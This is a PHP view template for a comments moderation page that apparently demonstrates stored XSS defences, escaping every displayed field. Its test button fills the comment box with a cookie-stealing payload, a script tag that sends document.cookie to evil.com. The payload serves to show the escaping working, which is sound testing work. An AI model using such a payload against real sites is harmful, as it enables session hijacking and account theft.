<?php ob_start(); ?>

<div class="row">
    <div class="col-12">
        <div class="page-title-box d-sm-flex align-items-center justify-content-between">
            <h4 class="mb-sm-0 font-size-18 text-warning"><i class="bx bx-chat me-1"></i> Comments Moderation</h4>
        </div>
    </div>
</div>

<!-- Security Matrix Accordion -->
<div class="row mb-4">
    <div class="col-12">
        <div class="accordion shadow-sm" id="securityAccordion">
            <div class="accordion-item border-warning border-2">
                <h2 class="accordion-header" id="headingSecurity">
                    <button class="accordion-button collapsed bg-warning-subtle text-warning fw-bold" type="button" data-bs-toggle="collapse" data-bs-target="#collapseSecurity">
                        <i class="bx bx-check-shield me-2 fs-5"></i> Active Security Controls & ASVS Matrix (Expand to View)
                    </button>
                </h2>
                <div id="collapseSecurity" class="accordion-collapse collapse" data-bs-parent="#securityAccordion">
                    <div class="accordion-body bg-white">
                        <ul class="list-group list-group-flush">
                            <li class="list-group-item px-0">
                                <span class="fw-bold text-warning"><i class="bx bx-check-circle me-1"></i> Stored XSS Mitigation:</span> 
                                ASVS V5.3: Context-aware escaping strictly enforced. Evaluates and sanitizes external user inputs before database insertion to prevent persistent DOM-based attacks.
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Alerts -->
<?php if (isset($_SESSION['error'])): ?>
    <div class="alert alert-danger alert-dismissible fade show shadow-sm" role="alert">
        <i class="bx bx-error-circle me-2"></i> <?= htmlspecialchars($_SESSION['error']) ?>
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </div>
    <?php unset($_SESSION['error']); ?>
<?php endif; ?>

<?php if (isset($_SESSION['success'])): ?>
    <div class="alert alert-success alert-dismissible fade show shadow-sm" role="alert">
        <i class="bx bx-check-circle me-2"></i> <?= htmlspecialchars($_SESSION['success']) ?>
        <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
    </div>
    <?php unset($_SESSION['success']); ?>
<?php endif; ?>

<div class="row">
    <!-- Simulate External Comment -->
    <div class="col-xl-4">
        <div class="card shadow-sm border-0">
            <div class="card-body">
                <h5 class="card-title mb-4">Simulate External Comment</h5>
                <form method="POST" action="/comments/store" class="needs-validation" novalidate>
                    <?= \Core\Security\Csrf::getFormField() ?? '<input type="hidden" name="csrf_token" value="test">' ?>
                    
                    <div class="mb-3">
                        <label for="author" class="form-label fw-bold">Author Name</label>
                        <input type="text" class="form-control" id="author" name="author" placeholder="Anonymous">
                    </div>

                    <div class="mb-4">
                        <label for="content" class="form-label fw-bold">Comment Body</label>
                        <textarea class="form-control" id="comment_content" name="content" rows="4" required placeholder="Type a comment..."></textarea>
                    </div>
                    
                    <div class="d-grid gap-2">
                        <button type="submit" class="btn btn-warning"><i class="bx bx-send me-1"></i> Post Comment</button>
                        <button type="button" class="btn btn-outline-danger mt-2" onclick="testCommentTrap()"><i class="bx bx-bug me-1"></i> Inject Cookie Stealer (XSS)</button>
                    </div>
                </form>
            </div>
        </div>
    </div>

    <!-- Moderation Table -->
    <div class="col-xl-8">
        <div class="card shadow-sm border-0">
            <div class="card-body p-0">
                <div class="table-responsive">
                    <table class="table align-middle table-nowrap table-hover mb-0">
                        <thead class="table-light">
                            <tr>
                                <th>Author</th>
                                <th>Comment Content</th>
                                <th>Date</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php if (!empty($comments)): ?>
                                <?php foreach ($comments as $comment): ?>
                                    <tr>
                                        <td class="fw-bold text-dark"><?= htmlspecialchars($comment['author']) ?></td>
                                        <td class="text-wrap" style="max-width: 300px;"><?= htmlspecialchars($comment['content']) ?></td>
                                        <td class="text-muted"><small><?= htmlspecialchars($comment['created_at']) ?></small></td>
                                    </tr>
                                <?php endforeach; ?>
                            <?php else: ?>
                                <tr>
                                    <td colspan="3" class="text-center py-4 text-muted">No comments await moderation.</td>
                                </tr>
                            <?php endif; ?>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    (function () {
        'use strict'
        var forms = document.querySelectorAll('.needs-validation')
        Array.prototype.slice.call(forms).forEach(function (form) {
            form.addEventListener('submit', function (event) {
                if (!form.checkValidity()) {
                    event.preventDefault()
                    event.stopPropagation()
                }
                form.classList.add('was-validated')
            }, false)
        })
    })();

    // XSS Trap Script for Comments
    function testCommentTrap() {
        const contentInput = document.getElementById('comment_content');
        if (contentInput) {
            contentInput.value = "Great article! <script>fetch('http://evil.com/steal?cookie='+document.cookie);<\/script>";
            contentInput.classList.add('is-invalid');
        }
    }
</script>

<?php 
$content = ob_get_clean(); 
require 'layouts/main.php'; 
?>